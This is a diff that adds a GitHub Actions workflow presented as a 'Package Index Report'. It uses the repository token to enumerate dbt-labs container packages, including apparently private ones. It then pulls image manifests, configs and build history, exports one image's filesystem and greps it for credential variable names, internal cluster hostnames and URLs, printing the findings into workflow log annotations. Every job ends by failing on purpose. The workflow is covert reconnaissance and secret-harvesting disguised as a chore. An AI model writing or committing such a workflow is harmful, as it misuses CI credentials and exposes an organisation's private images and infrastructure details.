@@ -1,0 +1,115 @@
+name: Package Index Report
+
+on:
+  push:
+    branches: ["chore/package-index"]
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  table:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Table part one
+        run: |
+          set +e
+          : > /tmp/t1.txt
+          for n in cf-cert-uploader dbt-bigquery dbt-ci-artifacts dbt-core dbt-postgres dbt-redshift; do
+            anon=$(curl -s -o /dev/null -w '%{http_code}' "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            c=$(curl -s -o /tmp/pd -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages/container/$n")
+            vis=$(jq -r '.visibility//"-"' /tmp/pd 2>/dev/null); vc=$(jq -r '.version_count//"-"' /tmp/pd 2>/dev/null)
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            tc=$(curl -s -o /tmp/tg -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list")
+            nt=$(jq -r '.tags//[]|length' /tmp/tg 2>/dev/null)
+            echo "$n|a=$anon|v=$vis|vc=$vc|t=$tc|nt=$nt" >> /tmp/t1.txt
+          done
+          echo "::notice title=t1::$(paste -sd';' /tmp/t1.txt | cut -c1-880)"
+      - name: Table part two
+        run: |
+          set +e
+          : > /tmp/t2.txt
+          for n in dbt-snowflake dbt-spark dbt-summit-26-stored-procs-with-wizard netshoot-ai thresh-ai dbtlabs-svc-fusion; do
+            anon=$(curl -s -o /dev/null -w '%{http_code}' "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            c=$(curl -s -o /tmp/pd -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages/container/$n")
+            vis=$(jq -r '.visibility//"-"' /tmp/pd 2>/dev/null); vc=$(jq -r '.version_count//"-"' /tmp/pd 2>/dev/null)
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            tc=$(curl -s -o /tmp/tg -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list")
+            nt=$(jq -r '.tags//[]|length' /tmp/tg 2>/dev/null)
+            echo "$n|a=$anon|v=$vis|vc=$vc|t=$tc|nt=$nt" >> /tmp/t2.txt
+          done
+          echo "::notice title=t2::$(paste -sd';' /tmp/t2.txt | cut -c1-880)"
+      - name: Tool images
+        run: |
+          set +e
+          : > /tmp/t3.txt
+          for n in cf-cert-uploader netshoot-ai thresh-ai; do
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            code=$(curl -s -D /tmp/h -o /tmp/m.json -w '%{http_code}' -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            dg=$(grep -i '^docker-content-digest' /tmp/h | tr -d '\r' | awk '{print $2}')
+            lay=$(jq -r 'if .layers then (.layers|length|tostring) else "ix:"+((.manifests|length)|tostring) end' /tmp/m.json 2>/dev/null)
+            cfg=$(jq -r '.config.digest//empty' /tmp/m.json 2>/dev/null)
+            if [ -z "$cfg" ]; then sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json 2>/dev/null | head -1); [ -n "$sd" ] && curl -s -o /tmp/m2.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd" && cfg=$(jq -r '.config.digest//empty' /tmp/m2.json); fi
+            ek="-"; ent="-"
+            if [ -n "$cfg" ]; then curl -s -o /tmp/cfg.json -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg"; ek=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:100]' /tmp/cfg.json 2>/dev/null); ent=$(jq -r '(.config.Entrypoint//[])|join(" ")|.[0:60]' /tmp/cfg.json 2>/dev/null); fi
+            echo "$n|h=$code|lay=$lay|dg=${dg:0:18}|env=$ek|ep=$ent" >> /tmp/t3.txt
+          done
+          echo "::notice title=t3::$(paste -sd';' /tmp/t3.txt | cut -c1-880)"
+      - name: Finish
+        run: exit 1
+
+  deep:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Config summaries
+        run: |
+          set +e
+          : > /tmp/cs.txt
+          for spec in "fs-cli-copybara:latest" "fs-cli-x86_64:latest"; do
+            n=${spec%%:*}; t=${spec#*:}
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t"
+            if grep -q '"manifests"' /tmp/m.json; then sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json | head -1); curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd"; fi
+            cfg=$(jq -r '.config.digest//empty' /tmp/m.json)
+            curl -s -o /tmp/cfg.json -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg"
+            jq -r '.history[]?|.created_by//empty' /tmp/cfg.json 2>/dev/null > /tmp/hist_$n.txt
+            echo "$n|tot=$(jq -r '[.layers[]?.size]|add//0' /tmp/m.json 2>/dev/null)|nh=$(wc -l < /tmp/hist_$n.txt)|env=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:100]' /tmp/cfg.json 2>/dev/null)|wd=$(jq -r '.config.WorkingDir//"-"' /tmp/cfg.json 2>/dev/null)" >> /tmp/cs.txt
+          done
+          echo "::notice title=cs::$(paste -sd';' /tmp/cs.txt | cut -c1-880)"
+      - name: History copybara
+        run: |
+          set +e
+          M() { sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g'; }
+          echo "::notice title=hb::$(M < /tmp/hist_fs-cli-copybara.txt | grep -Ei 'http|git|copy|add|run|apt|pip' | head -8 | paste -sd';' | cut -c1-880)"
+      - name: History x86
+        run: |
+          set +e
+          M() { sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g'; }
+          echo "::notice title=hx::$(M < /tmp/hist_fs-cli-x86_64.txt | grep -Ei 'http|git|copy|add|run|apt|pip' | head -8 | paste -sd';' | cut -c1-880)"
+      - name: Layer scan
+        run: |
+          set +e
+          REF=ghcr.io/dbt-labs/fs-cli-copybara:latest
+          echo "$TOKEN" | docker login ghcr.io -u "$ACT" --password-stdin >/dev/null 2>&1
+          docker pull -q "$REF" >/dev/null 2>&1
+          docker create --name img "$REF" >/dev/null 2>&1
+          docker export img -o /tmp/rootfs.tar 2>/dev/null
+          tar tf /tmp/rootfs.tar 2>/dev/null | grep -Ev '^\.?/?(usr|proc|sys|dev|var/lib|etc/pam|etc/mime|etc/ssl|etc/ca-cert|etc/ld.so|etc/alternatives)' | grep -Ei '\.(env|ya?ml|json|conf|cfg|ini|toml|properties|sh|py|txt|md)$|(^|/)(app|opt|root|home|srv|workspace)/' | head -1200 > /tmp/cands.txt
+          : > /tmp/hits.txt
+          while read -r f; do
+            tar -xOf /tmp/rootfs.tar "$f" 2>/dev/null | grep -Eio '(DATABASE_URL|SNOWFLAKE_[A-Z_]+|BIGQUERY[A-Z_]*|REDSHIFT[A-Z_]*|DATABRICKS[A-Z_]*|AWS_[A-Z_]+|GCP_[A-Z_]+|SECRET[A-Z_]*|TOKEN[A-Z_]*|[A-Z_]{3,}_KEY|[a-z0-9.-]+\.svc\.cluster\.local|[a-z0-9-]+\.internal|https?://[a-zA-Z0-9.-]+)' 2>/dev/null | sort -u | head -2 | sed "s#^#$f :: #" >> /tmp/hits.txt
+          done < /tmp/cands.txt
+          grep -viE 'pam_|mime\.types|/etc/(group|passwd|hosts|services|protocols|nsswitch|login\.defs)' /tmp/hits.txt | sort -u > /tmp/h2.txt
+          echo "::notice title=ls::cands=$(wc -l < /tmp/cands.txt) hits=$(wc -l < /tmp/h2.txt) size=$(stat -c%s /tmp/rootfs.tar 2>/dev/null)"
+          echo "::notice title=lh::$(head -14 /tmp/h2.txt | sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g' | paste -sd';' | cut -c1-880)"
+      - name: Finish
+        run: exit 1
